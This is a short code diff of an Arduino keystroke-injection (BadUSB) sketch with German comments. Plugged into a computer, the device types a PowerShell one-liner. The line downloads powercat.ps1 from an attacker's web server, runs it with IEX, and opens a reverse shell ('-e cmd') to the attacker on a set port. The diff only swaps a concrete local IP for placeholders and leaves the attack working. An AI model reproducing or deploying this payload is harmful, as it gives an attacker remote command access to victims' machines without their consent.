@@ -30,7 +30,7 @@ void setup() {
   Keyboard.releaseAll(); 
   delay(3000);
   // Powershell Befehl um eine Datei vom Python WebServer des Angreifers herunterzuladen und sie auszuführen
-  const char* command = "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.178.65/powercat.ps1');powercat -c 192.168.178.65 -p 4444 -e cmd";
+  const char* command = "IEX(New-Object System.Net.WebClient).DownloadString('http://[Attacker-IP]/powercat.ps1');powercat -c [Attacker-IP] -p [Port] -e cmd";
   for (int i = 0; i < strlen(command); i++) {
     Keyboard.print(command[i]);   // Zeichen einzeln senden
     delay(20);                    // Kurze Verzögerung zwischen den Zeichen
